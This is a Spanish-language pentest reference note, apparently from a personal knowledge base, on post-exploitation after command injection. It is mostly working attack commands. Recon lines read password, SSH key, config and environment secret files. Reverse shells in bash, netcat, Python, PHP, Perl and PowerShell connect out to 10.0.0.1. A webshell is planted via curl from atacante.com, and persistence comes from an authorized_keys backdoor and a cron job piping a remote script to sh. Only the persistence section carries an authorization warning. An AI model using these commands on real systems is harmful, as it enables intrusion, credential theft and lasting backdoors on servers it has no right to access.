---
tipo: meta
aliases:
  - Reverse shells
  - Impacto command injection
tags:
  - meta/referencia
  - dominio/web
---

# Command injection impacto - matriz de referencia

> [!info] Referencia pura, no un zettel
> Qué hacer una vez confirmada la ejecución. El criterio de **si conviene** llegar hasta acá está en [[Command injection - a shell interactiva]] — abrir una sesión interactiva es el paso que convierte una vulnerabilidad web en un incidente visible.

## 1. Reconocimiento sin abrir sesión

Casi todo lo que hace falta se saca sin shell interactiva y sin conexión saliente. Conviene agotarlo primero.

`id; uname -a; hostname; pwd`
Contexto básico en una sola petición.

`cat /etc/passwd`
`ls -la /home/*/.ssh/`
`cat /var/www/html/config.php`
`env`
Credenciales y configuración. `env` es lo más rentable en contenedores: ahí viven casi siempre los secretos.

`cat /proc/1/cgroup; ls -la /.dockerenv`
¿Es un contenedor? Cambia todo el plan posterior.

`sudo -l`
`find / -perm -4000 -type f 2>/dev/null`
Escalada. Sin TTY, `sudo -l` falla si pide contraseña.

## 2. Reverse shell

Escuchar primero: `nc -lvnp 443`. Se prefiere 443 o 80 — son los puertos que casi siempre salen.

`bash -i >& /dev/tcp/10.0.0.1/443 0>&1`
El clásico. Requiere `bash` real, no `sh`. En muchos contextos hay que envolverlo: `bash -c 'bash -i >& /dev/tcp/10.0.0.1/443 0>&1'`.

`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.0.0.1 443 >/tmp/f`
Con `nc` sin `-e`, que es la versión que trae casi toda distribución moderna. Deja un FIFO en `/tmp`: hay que borrarlo.

`nc -e /bin/sh 10.0.0.1 443`
Solo con `netcat-traditional`. Corto, pero suele no estar.

`python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.0.0.1",443));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'`
Python. **Ya viene con TTY**, lo que ahorra todo el paso 3.

`php -r '$s=fsockopen("10.0.0.1",443);exec("/bin/sh -i <&3 >&3 2>&3");'`
PHP. Útil porque en un servidor web el binario está garantizado.

`perl -e 'use Socket;$i="10.0.0.1";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'`
Perl. Presente en sistemas viejos donde no hay Python 3.

`powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('10.0.0.1',443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII).GetBytes($r),0,$r.Length);$s.Flush()}"`
Windows. Va codificado con `-enc` en UTF-16LE si hay filtro de firma.

## 3. Promover a TTY completo

Sin TTY no andan `sudo`, `ssh` ni nada a pantalla completa, y `Ctrl-C` mata la sesión entera.

`python3 -c 'import pty;pty.spawn("/bin/bash")'`
Primer paso, el más habitual.

`script -qc /bin/bash /dev/null`
Alternativa sin Python. Parte de `util-linux`, casi siempre presente.

Después, desde la shell **local** (no la remota):

```
Ctrl-Z
stty raw -echo; fg
```

Y de vuelta en la remota:

```
export TERM=xterm-256color
stty rows 50 cols 200
```

Los valores de `rows` y `cols` se sacan de `stty size` en la terminal local. Sin esto, `vim` y `less` dibujan mal.

## 4. Webshell en vez de sesión

Cuando conviene no abrir conexión saliente — ver [[Webshell]] para el criterio y [[Webshells - matriz de referencia]] para el código.

`; echo '<?php system($_GET[0]);?>' > /var/www/html/.s.php`
`; curl http://atacante.com/s.php -o /var/www/html/.s.php`
Deja archivo en disco, que es la contrapartida: menos ruido de red, más evidencia persistente.

## 5. Persistencia

> [!warning] Fuera de alcance salvo autorización explícita
> Modificar claves SSH, cron o servicios cambia el estado del sistema y suele estar fuera del alcance de una prueba web. Se documenta la posibilidad; no se ejecuta sin acuerdo por escrito.

`; echo 'ssh-rsa AAAA...' >> /root/.ssh/authorized_keys`
`; (crontab -l; echo '* * * * * curl http://atacante.com/s|sh') | crontab -`

Ambas dejan rastro obvio y ambas hay que revertir.

## 6. Pivote

`; ss -tlnp`
`; cat /etc/hosts`
`; ip route`
Mapear la red interna antes de moverse. En un contenedor, `/etc/hosts` y las variables de entorno suelen revelar los nombres de los demás servicios.
